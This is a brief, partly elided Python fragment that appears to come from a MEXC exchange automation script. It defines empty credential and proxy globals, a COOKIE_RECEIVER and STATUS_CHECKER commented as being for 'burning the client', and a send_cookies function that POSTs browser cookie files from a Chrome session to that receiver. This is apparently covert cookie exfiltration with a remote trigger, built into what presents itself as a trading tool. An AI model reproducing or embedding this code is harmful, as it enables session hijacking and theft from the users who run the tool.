...
PASSWORD = ""
PROXY = ""
COOKIE_RECEIVER = ""#For burning the client
STATUS_CHECKER = ""#For checking if should burn the client

MEXC_LOGIN = ''
MEXC_PASS = ''

#^personal detail global variables
...
def send_cookies(chrome):
    ...
    r = requests.post(COOKIE_RECEIVER, files=myfiles)
